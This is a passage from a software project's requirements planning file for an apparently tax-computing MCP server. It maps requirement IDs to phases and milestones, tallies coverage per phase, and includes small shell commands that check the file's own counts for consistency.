>   cb=$(grep -oE "^- \[[ x]\] \*\*${r}\*\*" .planning/REQUIREMENTS.md | grep -oE '\[[ x]\]' | head -1)
>   tb=$(grep -E "^\| ${r} " .planning/REQUIREMENTS.md | awk -F'|' '{print $6}' | tr -d ' ')
>   { [ "$cb" = '[x]' ] && [ "$tb" != Complete ] && [ "$tb" != Done ]; } && echo "MISMATCH $r $cb $tb"
> done
> ```
> **A second source of truth is safe only when something watches it drift.** Nothing watches
> this one — the command above is not run by any gate. **Phase 17 (Documentation Truth Pass)
> owns making it an actual check** rather than a snippet someone has to remember.

| REQ-ID | Tier | Phase | Milestone | Status |
|--------|------|-------|-----------|--------|
| DOCC-01 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-02 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-03 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-05 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-06 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-07 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| MCP-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-02 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-03 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-04 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-05 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-06 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| MCP-07 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| MCP-08 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| MCP-09 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| TEST-01 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| TEST-02 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| TEST-03 | T2 | Phases 8-15 - standing, per phase | Weeks 2-5 | Complete |
| TEST-04 | T2 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| MAINT-01 | T3 | Phase 16 - Orphan Ingestion Island | Backlog | Pending |
| MAINT-02 | T3 | Phase 17 - Documentation Truth Pass | Backlog | Pending |
| MAINT-03 | T3 | Phase 17 - Documentation Truth Pass | Backlog | Pending |
| MAINT-04 | T3 | Phase 17 - Documentation Truth Pass | Backlog | Pending |
| MAINT-05 | T3 | Phase 17 - Documentation Truth Pass | Backlog | Pending |
| MAINT-06 | T3 | Phase 18 - Dependency and Duplication Debt | Backlog | Pending |
| MAINT-07 | T3 | Phase 18 - Dependency and Duplication Debt | Backlog | Pending |
| MAINT-08 | T3 | Phase 18 - Dependency and Duplication Debt | Backlog | Pending |
| EXEC-01 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-02 | T0 | Delivered upstream (fjs 0.41.0, functionalscript#1419) | Week 1 | Done |
| EXEC-03 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-04 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-05 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-06 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-07 | T0 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| EXEC-08 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-09 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| EXEC-10 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-11 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-12 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-13 | T2 | Phase 19 - Reproducibility and Report Provenance | Week 4 | Complete |
| DOC-00 | T0 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-01 | T0 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-02 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| DOC-03 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-04 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-05 | T2 | Phase 5 - Document Base and First Dialects (pulled forward) | Week 1 | Complete |
| DOC-06 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| DOC-07 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| DOC-08 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| DOC-09 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| DOC-10 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-11 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-12 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-13 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| DOC-14 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-15 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| DOC-16 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| DOC-17 | T2 | Phase 5 - Document Base and First Dialects (added) | Week 1 | Complete |
| DOC-18 | T2 | Phase 20 - Unemployment Compensation (retrofitted) | Week 5 | Complete |
| EXACT-01 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-02 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-03 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-04 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-05 | T1 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| TAX-01 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| TAX-02 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| TAX-03 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-04 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| TAX-05 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-06 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-07 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| TAX-08 | T2 | Phase 10 - 1040 Core and Scope Guard | Week 3 | Complete |
| TAX-09 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-10 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-11 | T2 | Phase 12.1 - The Capital-Gain Chain | Week 3 | Complete |
| TAX-12 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-13 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-14 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-15 | T2 | Phase 12.1 - The Capital-Gain Chain | Week 3 | Complete |
| TAX-16 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-17 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| TAX-18 | T2 | Phase 20 - Unemployment Compensation (retrofitted) | Week 5 | Complete |
| PROV-01 | T1 | Phase 9 - Traceable Report Lines | Week 2 | Complete |
| PROV-02 | T1 | Phase 9 - Traceable Report Lines | Week 2 | Complete |
| PROV-03 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| PROV-04 | T2 | Phase 19 - Reproducibility and Report Provenance | Week 4 | Complete |
| PROV-05 | T2 | Phase 19 - Reproducibility and Report Provenance | Week 4 | Complete |
| PROV-06 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| PROV-07 | T2 | Phase 9 - Traceable Report Lines | Week 2 | Complete |
| PROV-08 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| SEC-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| SEC-02 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| SEC-03 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| SEC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |

### Coverage by phase

| Phase | Milestone | Requirements | Count | Tiers |
|-------|-----------|--------------|-------|-------|
| 1. Planning-Document Corrections | Week 0 | DOCC-01, DOCC-02, DOCC-03, DOCC-04, DOCC-05, DOCC-06, DOCC-07, SEC-04 | 8 | T0 |
| 2. Server Skeleton and Registration | Week 0 | MCP-01, MCP-02, MCP-03, MCP-04, MCP-05, SEC-01, DOC-02 | 7 | T0 |
| 3. The Restricted Interpreter | Week 1 | EXEC-01, EXEC-02, EXEC-03, EXEC-04, EXEC-05, EXEC-06 | 6 | T0 |
| 4. Exact Arithmetic | Week 1 | EXACT-01, EXACT-02, EXACT-03, EXACT-04, EXACT-05 | 5 | T0, T1 |
| 5. Document Base and First Dialects | Week 1 | DOC-00, DOC-01, DOC-03, DOC-04, DOC-05, DOC-10, DOC-11, DOC-12, DOC-14, DOC-17 | 10 | T0, T1, T2 |
| 6. Guest ABI and Materialization | Week 1 | EXEC-07, EXEC-09, SEC-02, SEC-03 | 4 | T0, T1 |
| 7. `fjs_run` and Run Records | Week 1 | EXEC-08, EXEC-10, EXEC-11, EXEC-12, PROV-03, MCP-06, TEST-01, TEST-02, TEST-04 | 9 | T1 |
| 8. TY2025 Parameters and Tax Table | Week 2 | TAX-01, TAX-02, TAX-04, MCP-07 | 4 | T1 |
| 9. Traceable Report Lines | Week 2 | PROV-01, PROV-02, PROV-07 | 3 | T1, T2 |
| 10. 1040 Core and Scope Guard | Week 2 | TAX-03, TAX-05, TAX-06, TAX-16 | 4 | T1 |
| 11. Wage, Retirement, Benefit Documents | Week 3 | DOC-08, DOC-09, DOC-15, MCP-08 | 4 | T2 |
| 12. Brokerage and Capital-Gain Chain | Week 3 | DOC-06, DOC-07, DOC-13, TAX-07, TAX-08, TAX-11, TAX-15 | 7 | T2 |
| 13. The 65+ Profile and Schedules | Week 3 | TAX-09, TAX-10, TAX-12, TAX-13, TAX-14 | 5 | T2 |
| 14. Acceptance | Week 4 | *(none - moved to Phase 19)* | 0 | T2 |
| 15. Realism Polish and Upstream | Week 5 | MCP-09, DOC-16, TAX-17, PROV-06, PROV-08 | 5 | T3 |
| 16. The Orphan Ingestion Island *(deferred)* | Week 5 | MAINT-01 | 1 | T3 |
| 17. Documentation Truth Pass | Week 5 | MAINT-02, MAINT-03, MAINT-04, MAINT-05 | 4 | T3 |
| 18. Dependency and Duplication Debt | Week 5 | MAINT-06, MAINT-07, MAINT-08 | 3 | T3 |
| 19. Reproducibility and Report Provenance | Week 4 | EXEC-13, PROV-04, PROV-05 | 3 | T2 |
| 20. Unemployment Compensation *(retrofitted)* | Week 5 | DOC-18, TAX-18 | 2 | T2 |
| *(standing, not a phase)* | Weeks 2-5 | TEST-03 | 1 | T2 |
| **Total** | | | **95** | |

> **This table under-counted by twelve until 2026-08-15.** It summed to 81 against a declared
> 93: Phase 7's row omitted the three TEST requirements the traceability table already assigned
> to it, phases 16, 17 and 18 had no rows at all, and TEST-03 — which maps to a phase *range* —
> had nowhere to go. Every one of those requirements was correctly listed twenty lines above, in
> the traceability table. **This is the project's most-repeated defect: a count that is true of
> the part someone examined and false of the whole.** Re-derive rather than read:
> ```sh
> # rows in the v1 traceability table -- SCOPED, because v2 has its own table below
> sed -n '/^## Traceability/,/^## v2 Requirements/p' .planning/REQUIREMENTS.md \
>   | grep -cE '^\| [A-Z]+-[0-9]+ \|'
> # sum of this table's Count column, excluding the Total row
> awk -F'|' '/^\| ([0-9]+[.] |\*\(standing)/{gsub(/ /,"",$5); s+=$5} END{print s}' .planning/REQUIREMENTS.md
> # the two MUST agree, at 95
> ```
> **The `sed` scoping is load-bearing, not tidiness.** The unscoped `grep` returned **96** the
> moment the v2 section was added, because v2's own traceability table has one single-ID row
> (`| TAX-19 |`) that matches the same pattern. A verification command that silently changes
> meaning when the document grows is not a check — and this one had been correct for exactly
> one day before a new section broke it.

**Cut line.** Phases 1-10 constitute a defensible v1 - the scope guard (TAX-16) is what
makes a partial 1040 honest rather than quietly wrong. Phases 11-13 complete the declared
taxpayer profile, and Phase 14's acceptance test cannot pass without them: a 65+ TY2025
return that omits Schedule 1-A is structurally wrong, not merely incomplete. See
ROADMAP.md "Scope Honesty and the Cut Line".

---
*Scoped 2026-08-03 from PROJECT.md, todo/plan.md, and the research corpus. Tier labels
indicate sequencing pressure, not importance.*
